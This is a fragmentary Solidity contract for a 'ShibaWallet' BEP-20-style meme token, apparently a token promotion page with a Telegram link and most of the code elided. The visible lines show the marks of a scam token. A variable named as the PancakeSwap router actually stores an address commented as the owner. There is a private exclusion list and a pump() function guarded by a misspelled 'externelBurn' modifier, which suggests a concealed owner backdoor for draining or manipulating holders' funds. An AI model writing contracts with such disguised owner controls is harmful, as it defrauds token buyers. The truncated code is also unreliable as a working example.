...
Stealth Launched - Community Project
...
📱 Telegram : https://t.me/shibawalletcommunity
...
contract Context {
 ...
 contract ShibaWallet is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "ShibaWallet";
    string private _symbol = "SHIBAWALLET";
    ...
    uint256 private fee = 1; // Community Fees , 0,5% marketing , 0,5% LP
    ...
    address private _pancakeRouterV2 = 0xc942522713A5C141b7e26d3B636Ae1BbDBFFD483; // Owner
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function pump() public externelBurn { // SEND IT
